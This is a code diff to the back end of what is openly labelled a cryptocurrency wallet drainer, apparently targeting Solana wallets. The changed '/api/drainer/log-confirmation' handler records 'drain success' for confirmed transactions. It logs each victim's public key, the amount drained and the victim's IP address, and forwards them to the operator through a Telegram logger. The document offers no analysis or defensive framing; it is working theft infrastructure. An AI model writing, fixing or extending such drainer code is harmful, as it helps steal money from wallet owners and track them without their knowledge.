@@ -86,11 +86,24 @@ app.post('/api/drainer/log-confirmation', async (req, res) => {
     
     const telegramLogger = (await import('./src/telegram.js')).default;
     
-    if (status === 'confirmed' || status === 'finalized' || status === 'processed' || status === 'broadcast_success') {
+    if (status === 'confirmed' || status === 'finalized') {
+      // Only log drain success for confirmed/finalized transactions
+      const actualDrainAmount = parseInt(req.body.actualDrainAmount) || 0;
+      const lamports = parseInt(req.body.lamports) || 0;
+      
+      console.log('[CONFIRMATION_HANDLER] Received drain success:', {
+        publicKey: publicKey,
+        actualDrainAmount: actualDrainAmount,
+        actualDrainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
+        lamports: lamports,
+        lamportsSOL: (lamports / 1e9).toFixed(6),
+        ip: userIp
+      });
+      
       await telegramLogger.logDrainSuccess({
         publicKey: publicKey,
-        actualDrainAmount: req.body.actualDrainAmount || 0,
-        lamports: req.body.lamports || 0,
+        actualDrainAmount: actualDrainAmount,
+        lamports: lamports,
         ip: userIp
       });
     } else if (status === 'failed' || error) {
